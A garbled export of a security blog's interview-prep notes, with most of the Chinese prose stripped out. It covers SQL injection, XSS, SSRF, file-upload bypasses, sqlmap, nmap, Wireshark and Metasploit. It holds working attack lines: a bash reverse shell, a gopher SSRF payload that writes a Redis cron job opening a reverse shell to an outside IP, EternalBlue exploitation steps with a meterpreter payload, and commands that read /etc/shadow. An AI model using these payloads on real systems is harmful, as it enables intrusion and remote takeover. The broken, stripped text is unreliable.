80300.0250.0.1\n>\n> - 160xC0.0xA8.0.1\n>\n> - 103232235521\n>\n> - 160xC0A80001\n>\n> - 1.1.278 / 1.1.755\n>\n> - 1.278 / 1.755 / 3.14159267\n>\n> - 0.0.0.0IP\n>\n> - `xip.io` IP\n>\n>   192.168.0.1.xip.io192.168.0.1\n\n\n\n#### \n\n> - \n> - \n> - \n> - \n> - DNS RebindingDNSHost\n\n1. GET\n2. httphttps\n3. CRLF\n4. setInstanceFollowRedirectsfalse302\n5. urlipv4   \n   1. ip\n   2. **ipurlip**DNS Rebinding\n\n\n\n### \n\n#### \n\n\n\n    \n    1Web\n    2\n    3\n\n\n![-1685330394483](https://cdn.jsdelivr.net/gh/R3damancy1/blog-pic/202404151439718.png)\n\n\n\n#### \n\n1.\n\nJS\n\n1\n2BurpSuit.\n2.\n1%00\n\nCorPHP,0x00xxx.php%00.jpg.jpg0x00xxx.php\nURL%00ASCII0ASCII0\n\n\n\n#### \n\n##### .htaccess\n\n> htaccess [apache](https://so.csdn.net/so/search?q=apache&spm=1001.2101.3001.7020)apache\n\n.htaccessSetHandler application/x-http-phpphpphpPHP\n\n\n\n##### .user.ini\n\nphp.iniphpweb.user.ini.htaccess.user.iniphp.ini\n\n```\nauto_prepend_file = <filename>         //\nauto_append_file = <filename>          //\n```\n\n.user.ini\n\n##### js\n\n\n\n##### \n\nphtml php3 php4 php5 Php php () php.pphphp\n\n##### content-type,GIF89a\n\n\n\n### csrf\n\n#### \n\n\n\nCSRFCookieCSRF\n\n\n\n#### \n\n1URL\n\n2Synchronizer Token,token\n\n3Referer HeaderURL\n\n4\n\n520\n\n6\n\n7postget\n\n8 XSS\n\n9\n\n10CSPContent-Security-Policy\n\n\n\n#### XXE\n\nXXEXML External Entity InjectionXMLXXEXML\n\nXMLXML\n\n  DOS\n\n\n\n### sqlmap\n\n#### \n\n-h                                           \n\n-hh                                         \n\n--version                                \n\n-v                                           0-6  1\n-u                                          url\n\n-d                                          \n\n-l                                           burp\n\n-r                                           http\n\n-g                                          google dorkurl\n\n-c                                          INI\n\n1.    --purge      --purge \n\n2.    --tables      \n\n3.    --dbs         \n\n4.    --current-db    \n\n5.    --current-user  \n\n6.    --is-dba   \n\n7.    --batch      \n\n8.    --search   -D -T -C CTD\n\n9.    --threads 10  sqlmap10\n\n10.    --level 3        sqlmapGETPOST--level2HTTP Cookie\n                                  3User-AgentHTTP Referer5\n11.    --risk 3           0-31risk\n\n12.    -v   (0-6)\n         0Python\n         1\n         2\n         3\n         4HTTP\n         5HTTP\n         6HTTP\n\n13.    --privileges  \n\n14.    --tamper xx.py,cc.py   tamperpy\n\n15.    --method \"POST\" --data \"page=1&id=2\"   POST\n\n16.    --threads number \n\n17.    --referer  \"\"  referer\n\n18.    --user-agent \"\"     user-agent\n\n19.    --proxy    \n\n1.url\n\n```\nsqlmap -u \"http:/192.168.3.2/sqli-labs-master/sqli-labs-master/Less-1/?id=1\"\n```\n\n2.url\n\n```\nsqlmap -m 1.txt\n```\n\n3.HTTP\n\n```\nsqlmap -r  url.txt\n```\n\n4.google\n\n```\nsqlmap -g \"inurl:\\\".php?id=1\\\"\"\n```\n\n5.burp\n\n```\nsqlmap -l    burp.txt\n```\n\n-sqlmap\n\n1.GET\n\n```\nsqlmap -u \"http:/192.168.3.2/sqli-labs-master/sqli-labs-master/Less-1/?id=1\"\n```\n\n2.POST\n\n```\nsqlmap -u \"http:/192.168.3.2/sqli-labs-master/sqli-labs-master/Less-1\"  --data=\"id=1\"\n```\n\n\n\n1.   sqlmap -u  \"http://www.xx.com?id=x\"    \n\n2.   --dbs         \n\n3.   --current-db    \n\n4.   --tables -D \"db_name\"   -D\n\n5.   --columns  -T \"table_name\" -D \"db_name\"  \n\n6.   --dump -C \"columns_name\" -T \"table_name\" -D \"db_name\"  \n\nPOST\n\n    1http:// www.xxx.com /login.asp\n    2brup\n    3\n    4burppost\n    5.txt\n    6sqlmap\n\nsqlmap -r okay.txt  -p  username\n\n// -r(5)-ppostname\n\n\n\n### AWVS\n\n#### \n\nAcunetix Web Vulnerability ScannerAWVSWebHTTP/HTTPSWebWeb\n\nAWVSSQLXSSWeb\n\n\n\n#### \n\n- AjaxWeb2.0\n\n- SQL\n\n- HTPP EditorHTTP Fuzzer\n\n- web\n\n- CAPTHCATwo Factor\n\n- VISA PCI\n\n- \n\n- web\n\n- AcunetixflashSOAPAJAX\n\n- web\n\n- \n\n\n\n#### \n\n- robots.txtAWVS\n\n- AWVS WVS3 \n\n- AWVSAlerts Node()\n\n- \n\n\n\n#### \n\n5DashboardTargetsVulnerabilitiesScansReports\n\n- Dashboard\n- Targets\n- Vulnerabilities\n- ScansTarget\n- Reports\n\n8UsersScan TypesNetwork ScannerIssue TrackersEmail SettingsEnginesExcluded HoursProxy Settings\n\n- Users\n- Scan TypesSQL \n- Network Scanner\n- Issue TrackersgithubgitlabJIRA\n- Email Settings\n- Engines\n- Excluded Hours\n- Proxy Settings\n\n\n\n### APPSCAN\n\n#### \n\nAppScanIBMwebWindowsWeb\n\n#### \n\n1web\n\n2HTTP Request\n\n3 Response \n\n\n\n### wireshark\n\n#### \n\n1\n 2\n 3\n\n#### \n\n``\n\n\n\n#### \n\n#### \n\ntcpTCP\n httpHTTP\n icmpICMP\n\n####  ip\n\n```\n ip.src ==192.168.1.104 192.168.1.104\n ip.dst==192.168.1.104, 192.168.1.104\n ip.addr == 192.168.1.104 IPIP192.168.1.104\n```\n\n#### \n\n```\ntcp.port ==80,  80\ntcp.srcport == 80,  TCP80\ntcp.dstport == 80TCP80\n```\n\n####  Http\n\n```\nhttp.request.method==GET, HTTP GET\n```\n\n####  and/or/not\n\nand/orIP192.168.1.104ICMP`ip.addr == 192.168.1.104 and icmp`\n\n\n\n### nmap\n\n| () |                                                          |\n| -------------------- | ------------------------------------------------------------ |\n| -sT                  | TCP connect() |\n| -sS                  | Root |\n| -sF  -sN             | FINXmas TreeNull                   |\n| -sP                  | pingNmappingNmap |\n| -sU                  | UDPUDP                                 |\n| -sA                  |                  |\n| -sV                  |                                              |\n| -Pn                  | pingping |\n| -v                   |                                        |\n| -h                   |                                  |\n| -p                   | 1-6553514331352280                   |\n| -O                   |                                |\n| -A                   |                            |\n| -oN/-oX/-oG          | XMLgrepable            |\n| -T4                  | TCP10ms                          |\n| -iL                  | -iL C:\\ip.txt                          |\n\n**1**\n\nnmap ip\n\n```\nnmap 192.168.0.101\n```\n\n**2**\n\nnmap ip1 ip2 \n\n```\nnmap 192.168.0.101 192.168.0.110\n```\n\n**3**\n\nnmap xxx.xxx.xxx.xxx-xxx\n\n```\nnmap 192.168.0.100-110\n```\n\n**4**\n\nnamp xxx.xxx.xxx.xxx/xx\n\n```\nnmap 192.168.0.1/24\n```\n\n**5**\n\nnmap -iL <File path>\n\n```\nnmap -iL /root/target.txt\n```\n\n**6**\n\nnmap ip -exclude ip\n\n```\nnmap 192.168.0.100-110 -exclude 192.168.0.103\n   nmap 192.168.0.1/24 -exclude 192.168.0.103 \n```\n\n**7**\n\nnmap ip -p 123\n\n```\n:nmap 192.168.0.101 -p 80,8080,3306,3389\n```\n\n**8C**\n\nnmap -sP ip\n\n```\nnmap -sP 192.168.0.1/24\n```\n\n**9**\n\nnmap -O ip\n\n```\nnmap -O 192.168.0.101\n```\n\n**10**\n\nnmap -sS -p (,) -v ip\n\n```\nnmap -sS -p 1-65535 192.168.0.101\n```\n\n\n\n### MSF\n\n#### \n\nMetasploitMSF\n\n\n\n****\n\n\n\n#### \n\n : `search ms17_010`\n\n1\n\n`use auxiliary/scanner/smb/smb_ms17_010`\n\n`options` \n\n`set rhosts 192.168.174.129`\n\n445nmapwindows445`set rport `\n\n`run``exploit` \n\n\n\n2\n\n\n\n`use exploit/windows/smb/ms17_010_eternalblue`\n\n`options` \n\n`set RHOSTS 192.168.174.129`\n\n`set RPORT 445`\n\npayload`set payload windows/x64/meterpreter/reverse_tcp`\n\n`set LHOST 192.168.174.192`\n\n`run``exploit` \n\n\n\n\n\n### Linux\n\n**netstat**\n\n\n\nnetstat []\n\n\n\n- -a\n- -n\n- -p\n- -tTCP\n- -uUDP\n- -r\n\n\n\n**network**\n\n\n\nnetworkservice network restart\n\n\n\n**chmod**\n\n\n\nLinux\n\n-  \n- d \n- s socket\n- l \n- p \n- c \n- b \n\n`uname -a`: Linux!(,Linux)\n\n\n\n- cat /etc/issue: ,(PS:)\n- cat /etc/*-release: (,,*ls /etc | grep \"release\"\"!)\n- cat /proc/version: ,gcc\n- cat /proc/sys/kernel/version: ,uname -v(/proc/sys/kernelLinux!!)\n\n\n\n\n\n\n    ps: \n        ps -elf: (-l)UID,PPIP,CSTIME(-f)(-e)\n        ps aux: (u)(a)(x)\n    top: Windows\n\n`cat /etc/passwd`: \n\n`cat /etc/shadow`: ,!\n\n`cat /etc/sudoers`:    \n\n`ifconfig -a`: \n\n`hostname`: \n\n\n\n#### shell\n\n```\nbash -i >& /dev/tcp/192.168.0.4/7777 0>&1\n```\n\n\n\n### OSI\n\n![-1685330434325](https://cdn.jsdelivr.net/gh/R3damancy1/blog-pic/202404151440002.png)****OSI\n\n****,\n\n****\n\n****\n\n**IP**/\n\n****\n\n****\n\n\n\n### TCP/IP\n\n#### ![-1685330444867](https://cdn.jsdelivr.net/gh/R3damancy1/blog-pic/202404151440451.png)\n\nTCP/IPOSI\n\nTCP/IPOSI\n\nTCP/IPUDP\n\n\n\n\n\n### xsscsrfssrf\n\n****\n XSSCSRF,SSRFWeb\n\n****\n XSShtml\n\nCSRF()httpreferCookie  \n\nSSRF(URLRUL","slug":"prepare","published":1,"updated":"2024-04-17T08:42:59.686Z","comments":1,"layout":"post","photos":[],"link":"","_id":"clv3kf7jc000th7763ola9iyg","content":"<h1 id=\"prepare\"><a href=\"#prepare\" class=\"headerlink\" title=\"prepare\"></a>prepare</h1><h3 id=\"\"><a href=\"#\" class=\"headerlink\" title=\"\"></a></h3><p></p>\n<p></p>\n<h3 id=\"sql\"><a href=\"#sql\" class=\"headerlink\" title=\"sql\"></a>sql</h3><h4 id=\"\"><a href=\"#\" class=\"headerlink\" title=\"\"></a><strong></strong></h4><p>mysqlsqlserveroracleaccesssqlitepostgreSQL</p>\n<ul>\n<li><p>mysql:3306 </p>\n</li>\n<li><p>sqlserver:1433 </p>\n</li>\n<li><p>orecal:1521 </p>\n</li>\n<li><p>PostgreSQL:5432 </p>\n</li>\n<li><p>db2:50000</p>\n</li>\n<li><p>MongoDB:27017 </p>\n</li>\n<li><p>redis:6379 </p>\n</li>\n<li><p>memcached:11211</p>\n</li>\n</ul>\n<h4 id=\"SQL\"><a href=\"#SQL\" class=\"headerlink\" title=\"SQL\"></a><strong>SQL</strong></h4><p><br> </p>\n<p></p>\n<p>GETPOSTCOOKIEHTTP</p>\n<h4 id=\"SQL\"><a href=\"#SQL\" class=\"headerlink\" title=\"SQL\"></a><strong>SQL</strong></h4><p></p>\n<ul>\n<li> </li>\n<li> </li>\n<li> </li>\n<li></li>\n</ul>\n<p></p>\n<ul>\n<li> </li>\n<li> </li>\n<li>WAF</li>\n</ul>\n<h4 id=\"sqlgetshell\"><a href=\"#sqlgetshell\" class=\"headerlink\" title=\"sqlgetshell\"></a>sqlgetshell</h4><ul>\n<li>SQL</li>\n<li>web</li>\n<li></li>\n<li>secure_file_privsecure_file_privload dumpfileinto outfileload_file()</li>\n</ul>\n<h4 id=\"\"><a href=\"#\" class=\"headerlink\" title=\"\"></a></h4><ul>\n<li></li>\n<li></li>\n<li>  &#x2F;**&#x2F;</li>\n<li> %20 %09 %0a</li>\n<li></li>\n<li></li>\n<li>join</li>\n<li>like</li>\n</ul>\n<h3 id=\"xss\"><a href=\"#xss\" class=\"headerlink\" title=\"xss\"></a>xss</h3><h4 id=\"\"><a href=\"#\" class=\"headerlink\" title=\"\"></a></h4><p>xssjavascriptjs</p>\n<h4 id=\"xss\"><a href=\"#xss\" class=\"headerlink\" title=\"xss\"></a>xss</h4><p><br> <br> scriptjs</p>\n<h4 id=\"xss\"><a href=\"#xss\" class=\"headerlink\" title=\"xss\"></a>xss</h4><h5 id=\"DOMXSS\"><a href=\"#DOMXSS\" class=\"headerlink\" title=\"DOMXSS\"></a>DOMXSS</h5><p>js</p>\n<h5 id=\"XSS\"><a href=\"#XSS\" class=\"headerlink\" title=\"XSS\"></a>XSS</h5><p>js</p>\n<h5 id=\"XSS\"><a href=\"#XSS\" class=\"headerlink\" title=\"XSS\"></a>XSS</h5><p>jsjs</p>\n<h4 id=\"xss\"><a href=\"#xss\" class=\"headerlink\" title=\"xss\"></a>xss</h4><ul>\n<li>COOKIE</li>\n<li>DOM</li>\n<li></li>\n<li>xss</li>\n<li></li>\n</ul>\n<h4 id=\"xss\"><a href=\"#xss\" class=\"headerlink\" title=\"xss\"></a>xss</h4><ul>\n<li></li>\n<li></li>\n<li>htmlHTMLEncodejavascriptJavaScriptEncodejavascriptEncodedata</li>\n<li>httponlytrue</li>\n</ul>\n<h4 id=\"\"><a href=\"#\" class=\"headerlink\" title=\"\"></a></h4><ul>\n<li><p></p>\n</li>\n<li><p>script<br></p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">&lt;input  value=&#x27;123&#x27; onclick=&#x27;alert()&#x27;&gt;</span><br></pre></td></tr></table></figure>\n</li>\n<li><p></p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">&lt;a src=javascript:alert()&gt;123&lt;/a&gt;</span><br></pre></td></tr></table></figure></li>\n</ul>\n<h3 id=\"ssrf\"><a href=\"#ssrf\" class=\"headerlink\" title=\"ssrf\"></a>ssrf</h3><h4 id=\"-1\"><a href=\"#-1\" class=\"headerlink\" title=\"\"></a></h4><p>Server Side Request Forgery, SSRFSSRF</p>\n<h4 id=\"\"><a href=\"#\" class=\"headerlink\" title=\"\"></a></h4><p>SSRFFile</p>\n<p>SSRF</p>\n<h4 id=\"\"><a href=\"#\" class=\"headerlink\" title=\"\"></a></h4><p>SSRF</p>\n<p>curl, dictRedisfilegopherShellPayload</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">curl -vvv &#x27;dict://127.0.0.1:6379/info&#x27;</span><br><span class=\"line\"> </span><br><span class=\"line\">curl -vvv &#x27;file:///etc/passwd&#x27;</span><br><span class=\"line\"> </span><br><span class=\"line\"># * : $</span><br><span class=\"line\"> </span><br><span class=\"line\">curl -vvv &#x27;gopher://127.0.0.1:6379/_*1%0d%0a$8%0d%0aflushall%0d%0a*3%0d%0a$3%0d%0aset%0d%0a$1%0d%0a1%0d%0a$64%0d%0a%0d%0a%0a%0a*/1 * * * * bash -i &gt;&amp; /dev/tcp/103.21.140.84/6789 0&gt;&amp;1%0a%0a%0a%0a%0a%0d%0a%0d%0a%0d%0a*4%0d%0a$6%0d%0aconfig%0d%0a$3%0d%0aset%0d%0a$3%0d%0adir%0d%0a$16%0d%0a/var/spool/cron/%0d%0a*4%0d%0a$6%0d%0aconfig%0d%0a$3%0d%0aset%0d%0a$10%0d%0adbfilename%0d%0a$4%0d%0aroot%0d%0a*1%0d%0a$4%0d%0asave%0d%0aquit%0d%0a&#x27;</span><br></pre></td></tr></table></figure>\n\n\n\n<h4 id=\"-1\"><a href=\"#-1\" class=\"headerlink\" title=\"\"></a></h4><p>IP192.168.0.1IP</p>\n<blockquote>\n<ul>\n<li><p>80300.0250.0.1</p>\n</li>\n<li><p>160xC0.0xA8.0.1</p>\n</li>\n<li><p>103232235521</p>\n</li>\n<li><p>160xC0A80001</p>\n</li>\n<li><p>1.1.278 &#x2F; 1.1.755</p>\n</li>\n<li><p>1.278 &#x2F; 1.755 &#x2F; 3.14159267</p>\n</li>\n<li><p>0.0.0.0IP</p>\n</li>\n<li><p><code>xip.io</code> IP</p>\n<p>192.168.0.1.xip.io192.168.0.1</p>\n</li>\n</ul>\n</blockquote>\n<h4 id=\"\"><a href=\"#\" class=\"headerlink\" title=\"\"></a></h4><blockquote>\n<ul>\n<li></li>\n<li></li>\n<li></li>\n<li></li>\n<li>DNS RebindingDNSHost</li>\n</ul>\n</blockquote>\n<ol>\n<li>GET</li>\n<li>httphttps</li>\n<li>CRLF</li>\n<li>setInstanceFollowRedirectsfalse302</li>\n<li>urlipv4   <ol>\n<li>ip</li>\n<li><strong>ipurlip</strong>DNS Rebinding</li>\n</ol>\n</li>\n</ol>\n<h3 id=\"\"><a href=\"#\" class=\"headerlink\" title=\"\"></a></h3><h4 id=\"\"><a href=\"#\" class=\"headerlink\" title=\"\"></a></h4><p></p>\n<pre><code>\n1Web\n2\n3\n</code></pre>\n<p><img  \n                       lazyload\n                       alt=\"image\"\n                       data-src=\"https://cdn.jsdelivr.net/gh/R3damancy1/blog-pic/202404151439718.png\"\n                        alt=\"-1685330394483\"\n                 ></p>\n<h4 id=\"\"><a href=\"#\" class=\"headerlink\" title=\"\"></a></h4><p>1.</p>\n<p>JS<br><br>1<br>2BurpSuit.<br>2.<br>1%00</p>\n<p>CorPHP,0x00xxx.php%00.jpg.jpg0x00xxx.php<br>URL%00ASCII0ASCII0</p>\n<h4 id=\"-2\"><a href=\"#-2\" class=\"headerlink\" title=\"\"></a></h4><h5 id=\"htaccess\"><a href=\"#htaccess\" class=\"headerlink\" title=\".htaccess\"></a>.htaccess</h5><blockquote>\n<p>htaccess <a class=\"link\"   href=\"https://so.csdn.net/so/search?q=apache&spm=1001.2101.3001.7020\" >apache<i class=\"fas fa-external-link-alt\"></i></a>apache</p>\n</blockquote>\n<p>.htaccessSetHandler application&#x2F;x-http-phpphpphpPHP</p>\n<h5 id=\"user-ini\"><a href=\"#user-ini\" class=\"headerlink\" title=\".user.ini\"></a>.user.ini</h5><p>php.iniphpweb.user.ini.htaccess.user.iniphp.ini</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">auto_prepend_file = &lt;filename&gt;         //</span><br><span class=\"line\">auto_append_file = &lt;filename&gt;          //</span><br></pre></td></tr></table></figure>\n\n<p>.user.ini</p>\n<h5 id=\"js\"><a href=\"#js\" class=\"headerlink\" title=\"js\"></a>js</h5><p></p>\n<h5 id=\"\"><a href=\"#\" class=\"headerlink\" title=\"\"></a></h5><p>phtml php3 php4 php5 Php php () php.pphphp</p>\n<h5 id=\"content-type-GIF89a\"><a href=\"#content-type-GIF89a\" class=\"headerlink\" title=\"content-type,GIF89a\"></a>content-type,GIF89a</h5><h3 id=\"csrf\"><a href=\"#csrf\" class=\"headerlink\" title=\"csrf\"></a>csrf</h3><h4 id=\"-2\"><a href=\"#-2\" class=\"headerlink\" title=\"\"></a></h4><p></p>\n<p>CSRFCookieCSRF</p>\n<h4 id=\"\"><a href=\"#\" class=\"headerlink\" title=\"\"></a></h4><p>1URL</p>\n<p>2Synchronizer Token,token</p>\n<p>3Referer HeaderURL</p>\n<p>4</p>\n<p>520</p>\n<p>6</p>\n<p>7postget</p>\n<p>8 XSS</p>\n<p>9</p>\n<p>10CSPContent-Security-Policy</p>\n<h4 id=\"XXE\"><a href=\"#XXE\" class=\"headerlink\" title=\"XXE\"></a>XXE</h4><p>XXEXML External Entity InjectionXMLXXEXML</p>\n<p>XMLXML</p>\n<p>  DOS</p>\n<h3 id=\"sqlmap\"><a href=\"#sqlmap\" class=\"headerlink\" title=\"sqlmap\"></a>sqlmap</h3><h4 id=\"\"><a href=\"#\" class=\"headerlink\" title=\"\"></a></h4><p>-h                                           </p>\n<p>-hh                                         </p>\n<p>version                                </p>\n<p>-v                                           0-6  1<br>-u                                          url</p>\n<p>-d                                          </p>\n<p>-l                                           burp</p>\n<p>-r                                           http</p>\n<p>-g                                          google dorkurl</p>\n<p>-c                                          INI</p>\n<ol>\n<li><p>purge      purge </p>\n</li>\n<li><p>tables      </p>\n</li>\n<li><p>dbs         </p>\n</li>\n<li><p>current-db    </p>\n</li>\n<li><p>current-user  </p>\n</li>\n<li><p>is-dba   </p>\n</li>\n<li><p>batch      </p>\n</li>\n<li><p>search   -D -T -C CTD</p>\n</li>\n<li><p>threads 10  sqlmap10</p>\n</li>\n<li><p>level 3        sqlmapGETPOSTlevel2HTTP Cookie<br>                       3User-AgentHTTP Referer5</p>\n</li>\n<li><p>risk 3           0-31risk</p>\n</li>\n<li><p>-v   (0-6)<br>  0Python<br>  1<br>  2<br>  3<br>  4HTTP<br>  5HTTP<br>  6HTTP</p>\n</li>\n<li><p>privileges  </p>\n</li>\n<li><p>tamper xx.py,cc.py   tamperpy</p>\n</li>\n<li><p>method POST data page&#x3D;1&amp;id&#x3D;2   POST</p>\n</li>\n<li><p>threads number </p>\n</li>\n<li><p>referer    referer</p>\n</li>\n<li><p>user-agent      user-agent</p>\n</li>\n<li><p>proxy    </p>\n</li>\n</ol>\n<p>1.url</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">sqlmap -u &quot;http:/192.168.3.2/sqli-labs-master/sqli-labs-master/Less-1/?id=1&quot;</span><br></pre></td></tr></table></figure>\n\n<p>2.url</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">sqlmap -m 1.txt</span><br></pre></td></tr></table></figure>\n\n<p>3.HTTP</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">sqlmap -r  url.txt</span><br></pre></td></tr></table></figure>\n\n<p>4.google</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">sqlmap -g &quot;inurl:\\&quot;.php?id=1\\&quot;&quot;</span><br></pre></td></tr></table></figure>\n\n<p>5.burp</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">sqlmap -l    burp.txt</span><br></pre></td></tr></table></figure>\n\n<p>-sqlmap</p>\n<p>1.GET</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">sqlmap -u &quot;http:/192.168.3.2/sqli-labs-master/sqli-labs-master/Less-1/?id=1&quot;</span><br></pre></td></tr></table></figure>\n\n<p>2.POST</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">sqlmap -u &quot;http:/192.168.3.2/sqli-labs-master/sqli-labs-master/Less-1&quot;  --data=&quot;id=1&quot;</span><br></pre></td></tr></table></figure>\n\n\n\n<ol>\n<li><p>sqlmap -u  <a class=\"link\"   href=\"http://www.xx.com/?id=x\" >http://www.xx.com?id=x<i class=\"fas fa-external-link-alt\"></i></a>    </p>\n</li>\n<li><p>dbs         </p>\n</li>\n<li><p>current-db    </p>\n</li>\n<li><p>tables -D db_name   -D</p>\n</li>\n<li><p>columns  -T table_name -D db_name  </p>\n</li>\n<li><p>dump -C columns_name -T table_name -D db_name  </p>\n</li>\n</ol>\n<p>POST</p>\n<pre><code>1http:// www.xxx.com /login.asp\n2brup\n3\n4burppost\n5.txt\n6sqlmap\n</code></pre>\n<p>sqlmap -r okay.txt  -p  username</p>\n<p>&#x2F;&#x2F; -r(5)-ppostname</p>\n<h3 id=\"AWVS\"><a href=\"#AWVS\" class=\"headerlink\" title=\"AWVS\"></a>AWVS</h3><h4 id=\"\"><a href=\"#\" class=\"headerlink\" title=\"\"></a></h4><p>Acunetix Web Vulnerability ScannerAWVSWebHTTP&#x2F;HTTPSWebWeb</p>\n<p>AWVSSQLXSSWeb</p>\n<h4 id=\"\"><a href=\"#\" class=\"headerlink\" title=\"\"></a></h4><ul>\n<li><p>AjaxWeb2.0</p>\n</li>\n<li><p>SQL</p>\n</li>\n<li><p>HTPP EditorHTTP Fuzzer</p>\n</li>\n<li><p>web</p>\n</li>\n<li><p>CAPTHCATwo Factor</p>\n</li>\n<li><p>VISA PCI</p>\n</li>\n<li><p></p>\n</li>\n<li><p>web</p>\n</li>\n<li><p>AcunetixflashSOAPAJAX</p>\n</li>\n<li><p>web</p>\n</li>\n<li><p></p>\n</li>\n</ul>\n<h4 id=\"\"><a href=\"#\" class=\"headerlink\" title=\"\"></a></h4><ul>\n<li><p>robots.txtAWVS</p>\n</li>\n<li><p>AWVS WVS3 </p>\n</li>\n<li><p>AWVSAlerts Node()</p>\n</li>\n<li><p></p>\n</li>\n</ul>\n<h4 id=\"\"><a href=\"#\" class=\"headerlink\" title=\"\"></a></h4><p>5DashboardTargetsVulnerabilitiesScansReports</p>\n<ul>\n<li>Dashboard</li>\n<li>Targets</li>\n<li>Vulnerabilities</li>\n<li>ScansTarget</li>\n<li>Reports</li>\n</ul>\n<p>8UsersScan TypesNetwork ScannerIssue TrackersEmail SettingsEnginesExcluded HoursProxy Settings</p>\n<ul>\n<li>Users</li>\n<li>Scan TypesSQL </li>\n<li>Network Scanner</li>\n<li>Issue TrackersgithubgitlabJIRA</li>\n<li>Email Settings</li>\n<li>Engines</li>\n<li>Excluded Hours</li>\n<li>Proxy Settings</li>\n</ul>\n<h3 id=\"APPSCAN\"><a href=\"#APPSCAN\" class=\"headerlink\" title=\"APPSCAN\"></a>APPSCAN</h3><h4 id=\"-1\"><a href=\"#-1\" class=\"headerlink\" title=\"\"></a></h4><p>AppScanIBMwebWindowsWeb</p>\n<h4 id=\"-1\"><a href=\"#-1\" class=\"headerlink\" title=\"\"></a></h4><p>1web</p>\n<p>2HTTP Request</p>\n<p>3 Response </p>\n<h3 id=\"wireshark\"><a href=\"#wireshark\" class=\"headerlink\" title=\"wireshark\"></a>wireshark</h3><h4 id=\"\"><a href=\"#\" class=\"headerlink\" title=\"\"></a></h4><p>1<br> 2<br> 3</p>\n<h4 id=\"\"><a href=\"#\" class=\"headerlink\" title=\"\"></a></h4><p><code></code></p>\n<h4 id=\"\"><a href=\"#\" class=\"headerlink\" title=\"\"></a></h4><h4 id=\"\"><a href=\"#\" class=\"headerlink\" title=\"\"></a></h4><p>tcpTCP<br> httpHTTP<br> icmpICMP</p>\n<h4 id=\"ip\"><a href=\"#ip\" class=\"headerlink\" title=\"ip\"></a>ip</h4><figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">ip.src ==192.168.1.104 192.168.1.104</span><br><span class=\"line\">ip.dst==192.168.1.104, 192.168.1.104</span><br><span class=\"line\">ip.addr == 192.168.1.104 IPIP192.168.1.104</span><br></pre></td></tr></table></figure>\n\n<h4 id=\"\"><a href=\"#\" class=\"headerlink\" title=\"\"></a></h4><figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">tcp.port ==80,  80</span><br><span class=\"line\">tcp.srcport == 80,  TCP80</span><br><span class=\"line\">tcp.dstport == 80TCP80</span><br></pre></td></tr></table></figure>\n\n<h4 id=\"Http\"><a href=\"#Http\" class=\"headerlink\" title=\"Http\"></a>Http</h4><figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">http.request.method==GET, HTTP GET</span><br></pre></td></tr></table></figure>\n\n<h4 id=\"-and-or-not\"><a href=\"#-and-or-not\" class=\"headerlink\" title=\" and&#x2F;or&#x2F;not\"></a> and&#x2F;or&#x2F;not</h4><p>and&#x2F;orIP192.168.1.104ICMP<code>ip.addr == 192.168.1.104 and icmp</code></p>\n<h3 id=\"nmap\"><a href=\"#nmap\" class=\"headerlink\" title=\"nmap\"></a>nmap</h3><table>\n<thead>\n<tr>\n<th>()</th>\n<th></th>\n</tr>\n</thead>\n<tbody><tr>\n<td>-sT</td>\n<td>TCP connect()</td>\n</tr>\n<tr>\n<td>-sS</td>\n<td>Root</td>\n</tr>\n<tr>\n<td>-sF  -sN</td>\n<td>FINXmas TreeNull</td>\n</tr>\n<tr>\n<td>-sP</td>\n<td>pingNmappingNmap</td>\n</tr>\n<tr>\n<td>-sU</td>\n<td>UDPUDP</td>\n</tr>\n<tr>\n<td>-sA</td>\n<td></td>\n</tr>\n<tr>\n<td>-sV</td>\n<td></td>\n</tr>\n<tr>\n<td>-Pn</td>\n<td>pingping</td>\n</tr>\n<tr>\n<td>-v</td>\n<td></td>\n</tr>\n<tr>\n<td>-h</td>\n<td></td>\n</tr>\n<tr>\n<td>-p</td>\n<td>1-6553514331352280</td>\n</tr>\n<tr>\n<td>-O</td>\n<td></td>\n</tr>\n<tr>\n<td>-A</td>\n<td></td>\n</tr>\n<tr>\n<td>-oN&#x2F;-oX&#x2F;-oG</td>\n<td>XMLgrepable </td>\n</tr>\n<tr>\n<td>-T4</td>\n<td>TCP10ms</td>\n</tr>\n<tr>\n<td>-iL</td>\n<td>-iL 